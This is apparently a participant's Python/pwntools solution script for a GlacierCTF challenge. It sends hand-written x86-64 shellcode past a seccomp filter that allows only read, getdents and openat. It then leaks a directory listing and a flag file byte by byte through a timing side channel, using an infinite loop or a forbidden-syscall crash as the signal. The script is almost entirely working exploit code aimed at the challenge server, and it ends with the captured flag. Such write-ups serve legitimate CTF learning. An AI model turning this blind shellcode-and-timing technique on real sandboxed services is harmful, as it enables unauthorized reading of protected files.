from pwn import *
import os

# The flag file has an arbitrary name, is the only file that ends with .txt and consists only of numbers 0-9 and letters. a-zA-Z)


# the program ask for a shellcode and execute it but
# seccomp-bpf is use and we are only allow to use the following syscall
# read
# getdents
# openat 
# 

# some info :
# -we cannot write, so we have to leak one byte at a time blindly using time constrain
# -the shellcode is retrieve using fgets so our shellcode cannot contain "\n" (0xa) 
# -by default we cannot pass a relative path to  openat except if we are using the following flag 
#   AT_FDCWD  https://manpages.ubuntu.com/manpages/focal/en/man2/open.2freebsd.html
#   this flag is a constant equal to -100

# to reproduce a setup similar to the remote i use this command:
#    socat tcp-listen:5000,fork,reuseaddr exec:./vuln,stderr


context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")
context.log_level = "error"


def leak_filename():
    curr_pos = 4401  # 0 
    leaked = ''
    possible_chars =".tx0123456789abcdefghijklmnopqrsuvwyzABCDEFGHIJKLMNOPQRSTUVWXYZ-" 
    # before using the whole wordlist use only ".tx" to find the sequence ".txt" 

    while ".txt" not in leaked:

        found = False
        print(f"LEAKED {hex(curr_pos)}: ", leaked)
       

        for i in possible_chars:
            
            curr_char = hex(ord(i))
        
            #p = process("./chall/vuln")
            #p = remote("localhost",5000)
            p = remote("chall.glacierctf.com",13383)
            start= time.time()
            p.recv(4096)
        
            payload = b'\x90'*21 
            payload += asm(shellcraft.openat(-100, '.',0,0))

            # getdents syscall using a big buffer and the fd return by openat
            payload+=asm('''
            mov    rdi,rax
            xor    edx, edx
            mov    edx, 0x1f40
            mov    rsi, rsp
            push   0x4e
            pop    rax
            syscall          
            ''')

            # test byte 
            # if fails use an unthorized syscall
            # else infite loop 

            payload +=asm(f'''
                lea rax,[rsi+{str(curr_pos)}]
                xor rbx,rbx
                mov bl, byte[rax]
                cmp bl, {curr_char}
                jnz exit
                je win
            exit:
                mov rax,0x4000000
                syscall       
            win:
                inc r9
                jmp win  
        
            ''')


            p.sendline(payload)
            try:
                # if we can recv we are in infinte loop
                print(p.recv(timeout=2))
                end = time.time()
                print("time: ",end-start)
                if end-start >=2:
                    leaked+=i
                    curr_pos+=1
                    found=True
                    print("hello")
                    p.close()
                    break
                p.close()
            except:
                # else we dont found the correct byte
                p.close()
        
        # if the tested byte is not  possible_char we pass to the next one
        if found == False:
            leaked+="_"
            curr_pos+=1
            
        print(leaked)

def read_file():
 
    # the flag filename 92b6a7746a414f259826adb75a8f6375.txt
  
    leaked = ""
    curr_pos = -1 
    while "}" not in leaked:
        found = False
        print(f"LEAKED {hex(curr_pos)}: ", leaked)
        for curr_char in range(255): 
            #p = process("./chall/vuln")
            p = remote("chall.glacierctf.com",13383)
            #p = remote("localhost",5000)
            start =time.time()
            p.recv()
            payload =asm(shellcraft.openat(-100, '92b6a7746a414f259826adb75a8f6375.txt',0,0))
            
            # read syscall, we use the fd return by openat
            payload +=asm('''
            mov rdi,rax
            xor eax,eax
            xor edx, edx
            mov  dh, 1
            mov  rsi, rsp
            syscall
            ''')

            # test byte
            # if fails use an unthorized syscall
            # else infinite loop 

            payload +=asm(f'''
                lea rax,[rsi+{str(curr_pos)}]
                xor rbx,rbx
                mov bl, byte[rax]
                cmp bl, {str(curr_char)}
                jnz exit
                jmp win
            exit:
                mov rax,0x49
                syscall       
            win:
                inc r9
                jmp win   
            ''')
            
            # in order to read the 10th char (because the program use fgets => EOF = "\n")

            # payload +=asm(f'''
            #     mov r9, 0x9
            #     inc r9
            #     lea rax,[rsi+r9]
            #     xor rbx,rbx
            #     mov bl, byte[rax]
            #     cmp bl, {str(curr_char)}
            #     jnz exit
            #     jmp win
            # exit:
            #     mov rax,0x49
            #     syscall       
            # win:
            #     inc r9
            #     jmp win   
            # ''')
        
    

            p.sendline(payload)
            try:
                
                print(p.recv(timeout=2))
                end = time.time()
                print("time: ",end-start)
                if end-start >=2:
                    leaked+=chr(curr_char)
                    curr_pos+=1
                    found=True
                    print("hello")
                    p.close()
                    break
                p.close()
            except:
                p.close()
            
            
 
        if found == False:
            leaked+="£"
            curr_pos+=1
    print(leaked)
   


#leak_filename()
read_file()

#  gctf{W41t_d1D_yoU_R3aLlY_r3Bu1Ld_L$?}